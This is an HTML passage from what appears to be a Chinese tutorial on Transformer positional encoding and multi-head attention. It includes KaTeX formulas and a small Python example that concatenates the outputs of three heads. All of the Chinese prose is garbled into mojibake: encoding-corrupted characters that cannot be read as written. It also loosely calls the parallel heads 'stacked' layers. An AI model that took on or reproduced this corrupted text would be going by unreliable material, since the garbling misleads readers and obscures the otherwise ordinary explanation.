<p>ä¸è¿‡ï¼Œè¿™ä¸ªçœ‹ä¼¼ä¸¥é‡çš„ç¼ºé™·æ—©å·²è¢«Transformerçš„è®¾è®¡è€…é¢„è§å¹¶ä¼˜é›…åœ°è§£å†³äº†ã€‚è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨å°†è¯åµŒå…¥å‘é‡è¾“å…¥Transformerå±‚ä¹‹å‰ï¼Œä¸ºå®ƒä»¬æ³¨å…¥<strong>ä½ç½®ä¿¡æ¯</strong>ï¼Œè¿™ä¸ªå…³é”®çš„æ¨¡å—ç§°ä¸º<strong>ä½ç½®ç¼–ç ï¼ˆPositional Encodingï¼‰</strong>ã€‚å…·ä½“åšæ³•æ˜¯<strong>ç”Ÿæˆä¸€ä¸ªä¸è¯åµŒå…¥å‘é‡ç»´åº¦ç›¸åŒé•¿åº¦ä¹Ÿç›¸åŒçš„â€œä½ç½®å‘é‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>â€ï¼Œå¹¶å°†å…¶ä¸è¯åµŒå…¥å‘é‡ç›¸åŠ </strong>ã€‚è¿™ä¸ªä½ç½®å‘é‡ä¸æ˜¯éšæœºçš„ï¼Œå®ƒå¿…é¡»èƒ½å¤Ÿå”¯ä¸€ä¸”æœ‰æ•ˆåœ°è¡¨å¾æ¯ä¸ªè¯åœ¨åºåˆ—ä¸­çš„ç»å¯¹ä½ç½®ï¼ˆç”šè‡³ç›¸å¯¹ä½ç½®ï¼‰,å¦‚æ­¤ä¸€æ¥ï¼Œè¾“å…¥æ¨¡å‹çš„å°±ä¸å†æ˜¯å•çº¯çš„è¯ä¹‰å‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œè€Œæ˜¯<strong>è¯ä¹‰ä¸ä½ç½®ä¿¡æ¯çš„èåˆä½“</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i + p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚è‡ªæ³¨æ„åŠ›æœºåˆ¶åœ¨æ­¤åŸºç¡€ä¸Šè®¡ç®—å…³è”æ—¶ï¼Œå°±ä¼šè‡ªç„¶è€Œç„¶åœ°åŒæ—¶è€ƒè™‘â€œä½ æ˜¯ä»€ä¹ˆè¯â€ä»¥åŠâ€œä½ å‡ºç°åœ¨å“ªé‡Œâ€è¿™ä¸¤é‡ä¿¡æ¯ã€‚</p>
<p>å…³äºâ€œä½ç½®ç¼–ç â€çš„æ·±å…¥å‰–æï¼Œæˆ‘å°†å…¶å®‰æ’åœ¨äº†æ–‡æœ«çš„é™„å½•ç« èŠ‚ï¼Œä»¥ä¾¿äºä¸»çº¿é˜è¿°çš„è¿è´¯æ€§ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯éšæ—¶å‚è€ƒã€‚</p>
<hr/>
<p>è‡³æ­¤ï¼Œä½ å·²ç»æŒæ¡äº†Transformeræœ€æ ¸å¿ƒçš„åŠ¨åŠ›å•å…ƒâ€”â€”<strong>è‡ªæ³¨æ„åŠ›ï¼ˆSelf-Attentionï¼‰</strong>ã€‚å®ƒèµ‹äºˆäº†åºåˆ—ä¸­æ¯ä¸ªå…ƒç´ â€œçºµè§‚å…¨å±€â€çš„èƒ½åŠ›ã€‚ç„¶è€Œï¼Œä¸€ä¸ªçœŸæ­£å¼ºå¤§çš„ç³»ç»Ÿï¼Œç»ä¸åº”æ»¡è¶³äºå•ä¸€çš„è§‚å¯Ÿè§†è§’ã€‚</p>
<p>å¦‚æœåªç”¨ä¸€ä¸ªè‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œå°±å¥½æ¯”åªç”¨ä¸€å¥—å›ºå®šçš„æ»¤é•œè§‚å¯Ÿä¸–ç•Œï¼Œå®ƒå¯èƒ½æ“…é•¿æ•æ‰æŸç§æ¨¡å¼ï¼Œä½†ä¼šå¿½ç•¥å…¶ä»–åŒæ ·é‡è¦çš„æ¨¡å¼ã€‚</p>
<p>äºæ˜¯ï¼Œ<strong>å¤šå¤´æ³¨æ„åŠ›ï¼ˆMulti-Head Attentionï¼‰</strong> åº”è¿è€Œç”Ÿã€‚å®ƒçš„è®¾è®¡å“²å­¦éå¸¸ç›´è§‚ï¼š<strong>ä¸å…¶è®©ä¸€ä¸ªæ³¨æ„åŠ›æœºåˆ¶å‹‰åŠ›æ•æ‰æ‰€æœ‰ç±»å‹çš„å…³ç³»ï¼Œä¸å¦‚å¹¶è¡Œéƒ¨ç½²å¤šä¸ªç‹¬ç«‹çš„æ³¨æ„åŠ›â€œå¤´â€ï¼Œè®©æ¯ä¸ªå¤´è‡ªç”±åœ°ã€ä¸“ä¸šåŒ–åœ°å­¦ä¹ å¹¶å…³æ³¨åºåˆ—ä¸­ä¸åŒæ–¹é¢çš„ä¾èµ–æ¨¡å¼</strong>ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šå°†å¤šå¤´æ³¨æ„åŠ›æƒ³è±¡æˆä¸€ä¸ªé«˜çº§åˆ«çš„ä¸“å®¶å§”å‘˜ä¼šã€‚é¢å¯¹ä¸€ä»½å¤æ‚çš„æ–‡ä»¶ï¼ˆè¾“å…¥åºåˆ—ï¼‰ï¼Œå§”å‘˜ä¼šä¸»å¸­ï¼ˆæ¨¡å‹ï¼‰ä¸ä¼šåªè¯¢é—®ä¸€ä½ä¸“å®¶ã€‚ç›¸åï¼Œä»–ä¼šåŒæ—¶å¬é›†ï¼š</p>
<ul>
<li>ä¸€ä½æ³•å¾‹ä¸“å®¶ï¼ˆå¤´1ï¼‰ï¼Œå®¡è§†æ¡æ¬¾é—´çš„é€»è¾‘ä¸åˆè§„æ€§ï¼›</li>
<li>ä¸€ä½è´¢åŠ¡ä¸“å®¶ï¼ˆå¤´2ï¼‰ï¼Œåˆ†ææ•°æ®é—´çš„å‹¾ç¨½å…³ç³»ï¼›</li>
<li>ä¸€ä½æŠ€æœ¯ä¸“å®¶ï¼ˆå¤´3ï¼‰ï¼Œè¯„ä¼°æ–¹æ¡ˆå®æ–½çš„å¯è¡Œæ€§ã€‚</li>
</ul>
<p>æ¯ä½ä¸“å®¶ç‹¬ç«‹æ’°å†™è‡ªå·±çš„åˆ†ææŠ¥å‘Šï¼ˆæ¯ä¸ªå¤´çš„è¾“å‡ºï¼‰ã€‚æœ€åï¼Œä¸»å¸­å°†æ‰€æœ‰æŠ¥å‘Šæ±‡æ€»ï¼ˆæ‹¼æ¥ï¼‰ï¼Œå¹¶ç»¼åˆå½¢æˆä¸€ä»½æœ€ç»ˆçš„å†³ç­–æ–‡ä»¶ã€‚è¿™ç§æ–¹å¼è¿œæ¯”ä¾èµ–å•ä¸€ä¸“å®¶çš„åˆ¤æ–­æ›´ä¸ºå…¨é¢å’Œç¨³å¥ã€‚</p>
<p>å¤šå¤´æ³¨æ„åŠ›çš„åŠŸèƒ½å’Œâ€œè‡ªæ³¨æ„åŠ›ï¼ˆself-Attentionï¼‰â€æ¨¡å—æ˜¯ä¸€æ ·çš„ï¼Œæœ¬è´¨ä¾ç„¶æ˜¯å°†ä¸€ä¸ªåºåˆ—è½¬åŒ–ä¸ºå¦ä¸€ä¸ªåºåˆ—ã€‚</p>
<p>æ—¢ç„¶æ˜¯å¤šå¤´æ³¨æ„åŠ›ï¼Œå…¶å®æˆ‘ä»¬å°±å¯ä»¥æƒ³åˆ°äº†ï¼Œå°±æ˜¯å¤šå †å å‡ ä¸ªSelf-Attentionå±‚å°±è¡Œäº†ï¼Œæœ‰å‡ ä¸ªå¤´ï¼Œå°±æœ‰å‡ ä¸ªSelf-Attentionå±‚ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> çš„è¾“å…¥çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬ä¸å†åªä½¿ç”¨ä¸€ä¸ªè‡ªæ³¨æ„åŠ›å±‚ï¼Œè€Œæ˜¯å‡†å¤‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span></span></span></span></span> ä¸ªï¼ˆä¾‹å¦‚ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">h=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">4</span></span></span></span></span>ï¼‰<strong>ç‹¬ç«‹çš„</strong>è‡ªæ³¨æ„åŠ›å±‚ã€‚æ¯ä¸ªå±‚éƒ½æœ‰è‡ªå·±ç‹¬æœ‰çš„ã€äº’ä¸å…±äº«çš„ä¸‰ç»„æƒé‡çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>W</mi><mi>k</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>W</mi><mi>v</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">{W_q^{(i)}, W_k^{(i)}, W_v^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3461em;vertical-align:-0.3013em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2527em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.3987em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span></span></span>ï¼Œå…¶ä¸­ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">i=1,2,...,h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">h</span></span></span></span></span>ã€‚</p>
<p>æˆ‘ä»¬å°†åŒä¸€ä¸ªè¾“å…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> å¹¶è¡Œåœ°é€å…¥è¿™ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span></span></span></span></span> ä¸ªè‡ªæ³¨æ„åŠ›å±‚ä¸­ï¼Œæ¯ä¸ªå¤´éƒ½ä¼šè¾“å‡ºä¸€ä¸ªå½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> çš„çŸ©é˜µã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è¿™äº›è¾“å‡ºçŸ©é˜µè¿›è¡Œåˆå¹¶ï¼ˆä¹Ÿå¯ä»¥å«æ‹¼æ¥ï¼‰æˆä¸€ä¸ªæ–°çŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Z_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Z_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>çš„å½¢çŠ¶ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>Ã—</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, out\_size \times h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span></span>ï¼›</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/895e4b581ef6472b899ed7513ba4e699~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=nwj75KDtxlyYWT5GOzlbtjS8G7c%3D" alt="c11.jpg" width="100%" loading="lazy"/></p>
<p>å½“ç„¶ï¼Œä¸ºäº†ç¡®ä¿è¾“å…¥è¾“å‡ºçŸ©é˜µçš„ç‰¹å¾/ç»´åº¦ç›¸åŒï¼Œåœ¨æ¯ä¸ªè‡ªæ³¨æ„å±‚çš„è¾“å‡ºæ—¶è¦æŠŠ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>è®¾ç½®ä¸ºâ€œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">emb\_size/h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mord">/</span><span class="mord mathnormal">h</span></span></span></span></span>â€</p>
<p>é¦–å…ˆï¼Œè¿˜æ˜¯å†å¼ºè°ƒä¸€ä¸‹è¿™ä¸ªç¬¦å·ï¼ˆåœ†åœˆå†…ä¸€ç«–ï¼‰çš„æ„æ€ï¼Œå®ƒå°±æ˜¯åˆå¹¶æ“ä½œ(ç±»ä¼¼PyTorchä¸­çš„ <code>torch.cat()</code> æˆ– NumPy ä¸­çš„ <code>np.concatenate()</code>)ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å‡è®¾æœ‰ä¸‰ä¸ªå¤´ï¼Œæ¯ä¸ªå¤´è¾“å‡ºç»´åº¦ä¸º out_size = 2</span>
Z_1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>],  
         [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>],   
         [<span class="hljs-number">1</span>, <span class="hljs-number">9</span>]]   

Z_2 = [[<span class="hljs-number">5</span>, <span class="hljs-number">9</span>],
         [<span class="hljs-number">8</span>, <span class="hljs-number">7</span>],
         [<span class="hljs-number">1</span>, <span class="hljs-number">6</span>]]

Z_3 = [[<span class="hljs-number">3</span>, <span class="hljs-number">0</span>],
         [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>],
         [<span class="hljs-number">4</span>, <span class="hljs-number">8</span>]]

<span class="hljs-comment"># æ²¿ç‰¹å¾ç»´åº¦ï¼ˆdim=1ï¼‰æ‹¼æ¥</span>
Z_out =    [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>],  <span class="hljs-comment"># ä½ç½®1ï¼šèåˆäº†3ä¸ªå¤´çš„è§†è§’</span>
            [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>],  <span class="hljs-comment"># ä½ç½®2ï¼šèåˆäº†3ä¸ªå¤´çš„è§†è§’</span>
            [<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>]]  <span class="hljs-comment"># ä½ç½®3ï¼šèåˆäº†3ä¸ªå¤´çš„è§†è§’</span>
</code></pre>
<p>è¿™å°±æ˜¯å¤šå¤´æ³¨æ„åŠ›äº†ï¼Œæ˜¯ä¸æ˜¯éå¸¸ç®€å•ï¼æˆ‘ä»¬å°±å¯ä»¥å°†ä¸Šé¢çš„è¿™ä¸ªç®—æ³•æµç¨‹å°è£…æˆMulti Head Attentionæ¨¡å—ã€‚</p>
